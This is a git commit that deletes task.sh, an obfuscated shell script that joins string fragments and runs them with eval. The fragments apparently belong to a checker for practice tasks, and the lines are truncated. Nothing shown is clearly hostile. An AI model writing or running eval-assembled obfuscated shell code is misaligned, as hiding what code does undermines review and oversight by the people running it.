88736f6419cb4b7b93a72014387cfc677cc43a3d
Kaivalya <77398795+KP-AGENT@users.noreply.github.com>
2022-04-23 18:19:55 +0530

    Delete task.sh

--- task.sh
+++
@@ -1,3 +0,0 @@
-z="
-";az=' 6.t';rBz='h)';gz=' 9.t';SBz='m"';Dz='> t1';kBz='rhel';oBz='5=$(';OBz='cess';UBz='test';Pz=' ]';nBz='sk4 ';sz='2m--';cz=' 7.t';oz='echo';VB$
-eval "$Az$Bz$Cz$Dz$z$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$z$Mz$Nz$Oz$Pz$z$Qz$z$Rz$Fz$Gz$Hz$Iz$Sz$Kz$Lz$z$Mz$Nz$Oz$Pz$z$Qz$z$Tz$Fz$Gz$Hz$Iz$Uz$Kz$Lz$z$Mz$Nz$Oz$
